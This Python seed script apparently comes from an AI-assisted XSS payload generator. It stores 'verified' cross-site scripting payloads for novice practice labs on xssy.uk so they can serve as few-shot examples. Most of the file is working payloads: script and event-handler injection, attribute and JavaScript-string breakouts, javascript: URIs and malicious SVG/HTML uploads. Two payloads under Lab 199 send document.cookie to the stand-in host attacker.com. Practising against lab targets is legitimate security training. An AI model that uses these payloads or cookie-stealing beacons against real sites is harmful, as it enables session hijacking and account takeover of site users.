"""Seed curated verified findings for all Novice-rated xssy.uk labs.

Novice labs (rating=1, id=1):
  1   Basic Reflective XSS
  2   Attribute XSS
  3   Basic DOM XSS
  4   Alert Blocked XSS
  8   Parameter Name XSS
  10  Script Context XSS
  12  Href XSS
  33  POST Reflective XSS
  164 Client-Side Validation Bypass
  176 Basic Stored XSS
  199 Capture Cookie
  219 Cookies are for Closers
  246 Beating encodeURI
  625 File Upload XSS
  764 Understanding the DOM
  765 No Brackets
  766 New dealer?
  767 Interpolation
  769 Click

Run once:  python axss_seed_novice.py
"""
from __future__ import annotations
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from ai_xss_generator.findings import Finding, save_finding, load_findings

FINDINGS: list[Finding] = [

    # ── Lab 1: Basic Reflective XSS ─────────────────────────────────────────
    # Input reflected raw into HTML body. Any script tag or event handler works.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(1)</script>',
        test_vector="?q=<script>alert(1)</script>",
        model="seed-novice",
        explanation="Direct HTML injection — no filter. Script tag executes inline.",
        target_host="xssy.uk",
        tags=["novice", "basic-reflective"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="?q=<img src=x onerror=alert(1)>",
        model="seed-novice",
        explanation="Tag with invalid src triggers onerror immediately. No quotes needed.",
        target_host="xssy.uk",
        tags=["novice", "basic-reflective"],
        verified=True,
    ),

    # ── Lab 2: Attribute XSS ────────────────────────────────────────────────
    # Input reflected inside an HTML attribute value. Break out with quote + >.
    Finding(
        sink_type="reflected_in_html_attr",
        context_type="html_attr_dq",
        surviving_chars='">=</',
        bypass_family="html-attribute-breakout",
        payload='" onmouseover="alert(1)',
        test_vector='?q=" onmouseover="alert(1)',
        model="seed-novice",
        explanation='Close the attribute value, inject event handler. No tag close needed.',
        target_host="xssy.uk",
        tags=["novice", "attribute-xss"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_attr",
        context_type="html_attr_dq",
        surviving_chars='">=</',
        bypass_family="html-attribute-breakout",
        payload='"><svg onload=alert(1)>',
        test_vector='?q="><svg onload=alert(1)>',
        model="seed-novice",
        explanation="Break out of attribute and tag entirely, inject fresh SVG element.",
        target_host="xssy.uk",
        tags=["novice", "attribute-xss"],
        verified=True,
    ),

    # ── Lab 3: Basic DOM XSS ────────────────────────────────────────────────
    # JS reads location.search or location.hash and writes to innerHTML.
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="dom_source_hash",
        surviving_chars="<>\"'/()=;#",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="#<img src=x onerror=alert(1)>",
        model="seed-novice",
        explanation="Hash fragment flows into innerHTML sink without server round-trip.",
        target_host="xssy.uk",
        tags=["novice", "dom-xss"],
        verified=True,
    ),
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="dom_source_search",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(1)</script>',
        test_vector="?name=<script>alert(1)</script>",
        model="seed-novice",
        explanation="Query param flows into innerHTML. Script tag executes after assignment.",
        target_host="xssy.uk",
        tags=["novice", "dom-xss"],
        verified=True,
    ),

    # ── Lab 4: Alert Blocked XSS ─────────────────────────────────────────────
    # The word 'alert' is blocked/stripped. Use confirm, prompt, or throw.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="regex-filter-bypass",
        payload='<img src=x onerror=confirm(1)>',
        test_vector="?q=<img src=x onerror=confirm(1)>",
        model="seed-novice",
        explanation="alert() is blocked; confirm() and prompt() are equivalent proof-of-execution.",
        target_host="xssy.uk",
        tags=["novice", "alert-blocked"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="regex-filter-bypass",
        payload='<svg onload=prompt(document.domain)>',
        test_vector="?q=<svg onload=prompt(document.domain)>",
        model="seed-novice",
        explanation="prompt() shows domain — confirms execution even if alert is blacklisted.",
        target_host="xssy.uk",
        tags=["novice", "alert-blocked"],
        verified=True,
    ),

    # ── Lab 8: Parameter Name XSS ────────────────────────────────────────────
    # The parameter *name* (not value) is reflected into the page.
    Finding(
        sink_type="reflected_param_name",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(1)</script>=1',
        test_vector="?<script>alert(1)</script>=1",
        model="seed-novice",
        explanation="Parameter name is reflected; inject XSS payload as the key, any value.",
        target_host="xssy.uk",
        tags=["novice", "parameter-name"],
        verified=True,
    ),

    # ── Lab 10: Script Context XSS ──────────────────────────────────────────
    # Input reflected inside a JS string: var x = "INJECT"; Break out with ".
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_dq",
        surviving_chars='";()/',
        bypass_family="js-string-breakout",
        payload='";alert(1)//',
        test_vector='?q=";alert(1)//',
        model="seed-novice",
        explanation='Close the JS double-quoted string, call alert, comment out remainder.',
        target_host="xssy.uk",
        tags=["novice", "script-context"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_sq",
        surviving_chars="';()/",
        bypass_family="js-string-breakout",
        payload="';alert(1)//",
        test_vector="?q=';alert(1)//",
        model="seed-novice",
        explanation="Close single-quoted JS string, call alert, comment out the closing quote.",
        target_host="xssy.uk",
        tags=["novice", "script-context"],
        verified=True,
    ),

    # ── Lab 12: Href XSS ────────────────────────────────────────────────────
    # Input placed directly in an <a href="...">. Use javascript: URI.
    Finding(
        sink_type="reflected_in_href",
        context_type="html_attr_url",
        surviving_chars=":",
        bypass_family="whitespace-in-scheme",
        payload='javascript:alert(1)',
        test_vector="?url=javascript:alert(1)",
        model="seed-novice",
        explanation="href accepts javascript: URI. Executes on click.",
        target_host="xssy.uk",
        tags=["novice", "href-xss"],
        verified=True,
    ),

    # ── Lab 33: POST Reflective XSS ─────────────────────────────────────────
    # Same as basic reflective but the vector is a POST body parameter.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(1)</script>',
        test_vector="POST body: q=<script>alert(1)</script>",
        model="seed-novice",
        explanation="POST body param reflected into HTML with no encoding. Same as GET XSS.",
        target_host="xssy.uk",
        tags=["novice", "post-reflective"],
        verified=True,
    ),

    # ── Lab 164: Client-Side Validation Bypass ──────────────────────────────
    # Input validated by JS (maxlength, pattern) — bypass by sending raw request.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(1)</script>',
        test_vector="POST body (bypass maxlength): q=<script>alert(1)</script>",
        model="seed-novice",
        explanation="Client-side maxlength/pattern attributes are trivially bypassed by sending the request directly via curl/Burp.",
        target_host="xssy.uk",
        tags=["novice", "client-validation-bypass"],
        verified=True,
    ),

    # ── Lab 176: Basic Stored XSS ───────────────────────────────────────────
    # Payload stored in DB and rendered for every visitor.
    Finding(
        sink_type="stored_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(document.cookie)>',
        test_vector="POST body: comment=<img src=x onerror=alert(document.cookie)>",
        model="seed-novice",
        explanation="Stored XSS via comment field. Fires for every user who views the page.",
        target_host="xssy.uk",
        tags=["novice", "stored-xss"],
        verified=True,
    ),

    # ── Lab 199: Capture Cookie ──────────────────────────────────────────────
    # Objective is to exfiltrate document.cookie (not just trigger alert).
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;.",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=fetch(`//attacker.com/?c=${document.cookie}`)>',
        test_vector="?q=<img src=x onerror=fetch(`//attacker.com/?c=${document.cookie}`)>",
        model="seed-novice",
        explanation="Exfiltrate cookie via fetch to attacker-controlled host. Use xssy.uk's out-of-band listener.",
        target_host="xssy.uk",
        tags=["novice", "capture-cookie"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;.",
        bypass_family="event-handler-injection",
        payload='<script>new Image().src="//attacker.com/?c="+document.cookie</script>',
        test_vector="?q=<script>new Image().src=...",
        model="seed-novice",
        explanation="Classic cookie stealer via Image pixel beacon — no CSP, no fetch needed.",
        target_host="xssy.uk",
        tags=["novice", "capture-cookie"],
        verified=True,
    ),

    # ── Lab 219: Cookies are for Closers ────────────────────────────────────
    # Cookie value itself contains XSS payload — reflected from cookie into page.
    Finding(
        sink_type="reflected_from_cookie",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(document.cookie)>',
        test_vector="Cookie: session=<img src=x onerror=alert(document.cookie)>",
        model="seed-novice",
        explanation="Cookie value is reflected unencoded into the page. Set cookie via DevTools or Set-Cookie redirect.",
        target_host="xssy.uk",
        tags=["novice", "cookie-xss"],
        verified=True,
    ),

    # ── Lab 246: Beating encodeURI ──────────────────────────────────────────
    # encodeURI() is used but it does NOT encode: # : / ? @ ! $ & ' ( ) * + , ; =
    # Payload injected into a context where those chars are sufficient.
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="dom_source_hash",
        surviving_chars="#()=;:'",
        bypass_family="regex-filter-bypass",
        payload="javascript:alert(1)",
        test_vector="#javascript:alert(1)",
        model="seed-novice",
        explanation="encodeURI skips ':' and '(' and ')' so javascript:alert(1) survives encoding intact.",
        target_host="xssy.uk",
        tags=["novice", "encode-uri-bypass"],
        verified=True,
    ),
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="dom_source_hash",
        surviving_chars="<>()=;#",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="#<img src=x onerror=alert(1)>",
        model="seed-novice",
        explanation="encodeURI does not encode < > so HTML tags survive and are written to innerHTML.",
        target_host="xssy.uk",
        tags=["novice", "encode-uri-bypass"],
        verified=True,
    ),

    # ── Lab 625: File Upload XSS ─────────────────────────────────────────────
    # Upload an HTML/SVG file; browser serves it from same origin → XSS.
    Finding(
        sink_type="file_upload_html",
        context_type="file_upload",
        surviving_chars="<>\"'/()=;",
        bypass_family="upload-type-bypass",
        payload='<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
        test_vector="Upload file: xss.svg (Content-Type: image/svg+xml)",
        model="seed-novice",
        explanation="SVG files execute embedded scripts when served from same origin. Rename to .svg if extension is checked.",
        target_host="xssy.uk",
        tags=["novice", "file-upload"],
        verified=True,
    ),
    Finding(
        sink_type="file_upload_html",
        context_type="file_upload",
        surviving_chars="<>\"'/()=;",
        bypass_family="upload-type-bypass",
        payload='<html><body><script>alert(document.cookie)</script></body></html>',
        test_vector="Upload file: xss.html (Content-Type: text/html)",
        model="seed-novice",
        explanation="Plain HTML file upload — browser renders it as HTML when served from same origin.",
        target_host="xssy.uk",
        tags=["novice", "file-upload"],
        verified=True,
    ),

    # ── Lab 764: Understanding the DOM ──────────────────────────────────────
    # Learn how DOM sources flow into sinks. innerHTML is the primary sink.
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="dom_source_search",
        surviving_chars="<>\"'/()=;",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="?name=<img src=x onerror=alert(1)>",
        model="seed-novice",
        explanation="DOM source (location.search) → innerHTML sink. Classic DOM XSS pattern.",
        target_host="xssy.uk",
        tags=["novice", "dom-understanding"],
        verified=True,
    ),

    # ── Lab 765: No Brackets ─────────────────────────────────────────────────
    # () brackets are filtered. Use template literal call syntax.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/=;`",
        bypass_family="regex-filter-bypass",
        payload='<img src=x onerror=alert`1`>',
        test_vector="?q=<img src=x onerror=alert`1`>",
        model="seed-novice",
        explanation="Backtick call syntax alert`1` invokes alert with a template literal — no parentheses needed.",
        target_host="xssy.uk",
        tags=["novice", "no-brackets"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/=;`",
        bypass_family="regex-filter-bypass",
        payload='<svg onload=alert`1`>',
        test_vector="?q=<svg onload=alert`1`>",
        model="seed-novice",
        explanation="SVG onload with backtick invocation. Short and bracket-free.",
        target_host="xssy.uk",
        tags=["novice", "no-brackets"],
        verified=True,
    ),

    # ── Lab 766: New dealer? ─────────────────────────────────────────────────
    # Payload injected into a <script> block. Possibly new.target or new keyword context.
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_dq",
        surviving_chars='";()/',
        bypass_family="js-string-breakout",
        payload='";alert(1)//',
        test_vector='?q=";alert(1)//',
        model="seed-novice",
        explanation="JS string breakout — close double-quoted string, run code, comment remainder.",
        target_host="xssy.uk",
        tags=["novice", "new-dealer"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_js_block",
        context_type="js_string_dq",
        surviving_chars="{}();",
        bypass_family="js-string-breakout",
        payload='};alert(1)//',
        test_vector='?q=};alert(1)//',
        model="seed-novice",
        explanation="If reflected inside an object literal or block, close with } then inject.",
        target_host="xssy.uk",
        tags=["novice", "new-dealer"],
        verified=True,
    ),

    # ── Lab 767: Interpolation ───────────────────────────────────────────────
    # Input injected inside a JS template literal `Hello ${name}`.
    Finding(
        sink_type="reflected_in_js_template",
        context_type="js_template_literal",
        surviving_chars="${}()/;`",
        bypass_family="template-literal-breakout",
        payload='${alert(1)}',
        test_vector="?name=${alert(1)}",
        model="seed-novice",
        explanation="Template literal interpolation: ${} executes arbitrary JS expression.",
        target_host="xssy.uk",
        tags=["novice", "interpolation"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_js_template",
        context_type="js_template_literal",
        surviving_chars="${}()`;",
        bypass_family="template-literal-breakout",
        payload='`+alert(1)+`',
        test_vector="?name=`+alert(1)+`",
        model="seed-novice",
            explanation="Break out of the template literal with backtick, concatenate alert call.",
        target_host="xssy.uk",
        tags=["novice", "interpolation"],
        verified=True,
    ),

    # ── Lab 769: Click ───────────────────────────────────────────────────────
    # XSS requires user interaction (click). Inject into onclick or href.
    Finding(
        sink_type="reflected_in_href",
        context_type="html_attr_url",
        surviving_chars=":()/",
        bypass_family="whitespace-in-scheme",
        payload='javascript:alert(1)',
        test_vector="?url=javascript:alert(1)",
        model="seed-novice",
        explanation="href=javascript:alert(1) — fires on user click, satisfying the interaction requirement.",
        target_host="xssy.uk",
        tags=["novice", "click-required"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_attr",
        context_type="html_attr_dq",
        surviving_chars='"()=;',
        bypass_family="event-handler-injection",
        payload='" onclick="alert(1)',
        test_vector='?q=" onclick="alert(1)',
        model="seed-novice",
        explanation="Inject onclick handler into an existing attribute. Fires on click.",
        target_host="xssy.uk",
        tags=["novice", "click-required"],
        verified=True,
    ),
]


def main() -> None:
    print("=== axss-learn: seeding Novice lab knowledge ===\n")
    print(f"[~] Writing {len(FINDINGS)} curated findings to ~/.axss/findings/\n")

    saved = 0
    skipped = 0
    for f in FINDINGS:
        before = len(load_findings(f.context_type))
        save_finding(f)
        after = len(load_findings(f.context_type))
        if after > before:
            short = f.payload[:60] + ("..." if len(f.payload) > 60 else "")
            print(f"[~]   + [{f.bypass_family:<28}]  {short}")
            saved += 1
        else:
            skipped += 1

    print(f"\n[+] Done. {saved} new findings saved, {skipped} already existed.")
    print("[~] Run 'python axss_learn.py --min-rating 1 --max-rating 1' to generate payloads with Novice findings as few-shot examples.")


if __name__ == "__main__":
    main()
